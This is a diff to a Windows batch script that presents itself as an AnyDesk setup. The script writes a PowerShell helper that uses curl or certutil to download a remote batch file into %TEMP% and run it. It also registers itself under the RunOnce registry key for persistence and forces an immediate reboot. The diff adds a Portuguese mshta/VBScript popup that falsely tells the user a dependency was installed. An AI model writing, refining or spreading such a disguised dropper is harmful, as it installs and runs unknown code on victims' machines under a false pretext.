@@ -203,7 +203,7 @@ set "_lnk=%TEMP%\_lnk.ps1"
 >> "%_lnk%" echo $tmp = '%TEMP%\initad.bat'
 >> "%_lnk%" echo 
 >> "%_lnk%" echo if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
->> "%_lnk%" echo     $lnkArgs = '/c ' + $q + 'curl -s -o ' + $q + $tmp + $q + ' ' + $q + $url + $q + ' ' + $aa + ' call ' + $q + $tmp + $q + $q
+>> "%_lnk%" echo     $lnkArgs = '/c ' + $q + 'curl -s -o ' + $q + $tmp + $q + ' ' + $q + $url + $q + ' ' + $a + ' call ' + $q + $tmp + $q + $q
 >> "%_lnk%" echo } else {
 >> "%_lnk%" echo     $lnkArgs = '/c ' + $q + 'certutil -urlcache -split -f ' + $q + $url + $q + ' ' + $q + $tmp + $q + ' ' + $a + ' ' + $q + $tmp + $q + $q
 >> "%_lnk%" echo }
@@ -329,12 +329,10 @@ exit /b 1
 if not exist "%selfPath%" copy /y "!batchPath!" "%selfPath%" >nul 2>&1
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "AnyDeskSetup" /t REG_SZ /d "cmd /c \"%selfPath%\"" /f >nul 2>&1
 
-echo  Component installed. Restart required.
-echo  After restart, AnyDesk setup continues automatically.
+mshta "vbscript:CreateObject(""WScript.Shell"").Popup(""Dependencia instalada com sucesso."" & Chr(13) & Chr(10) & Chr(13) & Chr(10) & ""O sistema sera reiniciado em 30 segundos."" & Chr(13) & Chr(10) & Chr(13) & Chr(10) & ""Clique em OK para reiniciar agora."",30,""Reinicializacao Necessaria"",48)(window.close)"
 
-timeout /t 15 >nul
 shutdown /r /t 0
-exit
+exit /B
  
  
 :vbs_download
